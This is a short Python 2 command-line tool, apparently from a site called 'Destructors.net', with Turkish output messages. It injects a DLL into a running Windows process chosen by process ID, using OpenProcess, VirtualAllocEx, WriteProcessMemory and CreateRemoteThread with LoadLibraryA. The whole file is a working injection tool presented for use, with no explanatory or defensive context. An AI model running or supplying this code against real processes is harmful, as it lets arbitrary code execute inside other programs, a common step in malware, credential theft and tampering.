#!/usr/bin/env python
# -*- coding: utf-8 -*
import sys
from ctypes import*
PAGE_READWRITE = 0x04
PROCESS_ALL_ACCESS = ( 0x00F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM = ( 0x1000 | 0x2000 )

print "DLL Injectior --Destructors.net"


print "[+] dllinj.py pid dll"

kernel32 = windll.kernel32
pid = sys.argv[1]
dll_path = sys.argv[2]

dll_len = len(dll_path)

h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )

if not h_process:
    print "[!] Belirtilen pid degeri bulunamadi :  %s" %(pid)
    
    sys.exit(0)

# Allocate space for DLL path
arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)

# Write DLL path to allocated space
written = c_int(0)
kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))

# Resolve LoadLibraryA Address
h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")

# Now we createRemoteThread with entrypoiny set to LoadLibraryA and pointer to DLL path as param
thread_id = c_ulong(0)

if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)):
    print "[!]  Inject Başarısız oldu "
    sys.exit(0)

print "[+]Belirtilen hedefde >>>> %08x yaratildi." %(thread_id.value)



